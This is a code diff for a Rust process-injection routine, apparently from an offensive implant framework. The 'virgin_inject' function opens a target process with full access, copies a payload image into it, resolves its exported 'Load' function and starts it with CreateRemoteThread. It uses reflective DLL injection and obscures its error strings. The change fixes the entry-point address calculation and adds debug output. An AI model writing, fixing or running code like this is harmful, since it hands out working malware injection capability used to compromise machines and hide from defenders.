@@ -1,4 +1,4 @@
-use std::{ffi::c_void, mem::transmute, ptr::null_mut};
+use std::{arch::asm, ffi::c_void, mem::transmute, ptr::null_mut};
 
 use shared::tasks::WyrmResult;
 use shared_no_std::export_resolver::{
@@ -16,6 +16,8 @@ use windows_sys::Win32::{
         Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS},
     },
 };
+
+use crate::utils::console::print_info;
 
 pub fn virgin_inject(buf: &[u8], pid: u32) -> WyrmResult<String> {
     let h_process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid) };
@@ -94,6 +96,11 @@ pub fn virgin_inject(buf: &[u8], pid: u32) -> WyrmResult<String> {
 
     let mut thread_id = 0;
 
+    #[cfg(debug_assertions)]
+    {
+        print_info(format!("Alloc: {:p}, load_fn: {:p}", p_alloc, p_entry));
+    }
+
     let h_thread = unsafe {
         CreateRemoteThread(
             h_process,
@@ -122,8 +129,18 @@ pub fn virgin_inject(buf: &[u8], pid: u32) -> WyrmResult<String> {
 }
 
 fn find_entrypoint(buf: &[u8], p_alloc: *const c_void) -> Result<*const c_void, String> {
-    let p_entry = match find_export_from_unmapped_file(&buf, "Load") {
-        Ok(p) => calculate_memory_delta(buf.as_ptr() as usize, p_alloc as usize),
+    match find_export_from_unmapped_file(buf, "Load") {
+        Ok(p) => {
+            print_info(format!(
+                "fn ptr unmap: {:p}/{}, p_alloc: {:p}/{}",
+                p as *const c_void, p as usize, p_alloc, p_alloc as usize,
+            ));
+            let Some(addr) = calculate_memory_delta(buf.as_ptr() as usize, p as usize) else {
+                return Err(sc!("Could not calculate memory delta.", 204).unwrap());
+            };
+            let addr_calculated = unsafe { p_alloc.add(addr) };
+            Ok(addr_calculated)
+        }
         Err(e) => {
             let part = match e {
                 ExportError::ImageTooSmall => sc!("Image too small", 65).unwrap(),
@@ -147,11 +164,5 @@ fn find_entrypoint(buf: &[u8], p_alloc: *const c_void) -> Result<*const c_void, 
             }
             return Err(msg);
         }
-    };
-
-    if let Some(f) = p_entry {
-        Ok(f as *const c_void)
-    } else {
-        Err(sc!("Could not calculate delta.", 173).unwrap())
     }
 }
